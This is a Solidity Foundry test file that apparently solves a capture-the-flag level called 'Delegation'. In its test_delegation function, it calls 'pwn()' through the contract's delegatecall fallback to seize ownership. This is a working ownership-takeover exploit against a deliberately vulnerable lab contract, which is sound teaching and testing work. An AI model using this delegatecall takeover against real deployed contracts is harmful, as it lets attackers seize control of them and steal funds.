// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Delegate, Delegation} from "src/Delegation.sol";
import {DelegationAttack} from "script/DelegationAttack.s.sol";

contract DelegationAttackTest is Test {
    error DelegationAttack__failed_delegation();
    Delegation delegation;
    Delegate delegate;
    DelegationAttack attack;
    address attacker;

    function setUp() external {
        attack = new DelegationAttack();
        (delegation, delegate, attacker) = attack.run();
        deal(attacker, 100 ether);
        console.log("Delegation Contract Address: ", address(delegation));
        console.log("Delegate Contract Address: ", address(delegate));
        console.log("Attacker Address: ", attacker);
    }

    function test_CorrectDelegateOwner() external view {
        assert(delegate.owner() == attacker);
    }

    function test_pwn() external {
        vm.prank(attacker);
        delegate.pwn();
        assert(delegate.owner() == attacker);
    }

    ////////////////////////////////////////////
    //////////////**Delegation Contract *////////
    //////////////////////////////////////////

    function test_CorrectDelegationOwner() external view {
        assert(delegation.owner() == address(attack));
    }

    function test_delegation() external {
        vm.prank(attacker);
        (bool success, ) = payable(address(delegation)).call(
            abi.encodeWithSignature("pwn()")
        );
        if (!success) revert DelegationAttack__failed_delegation();
        assert(delegation.owner() == attacker);
    }
}
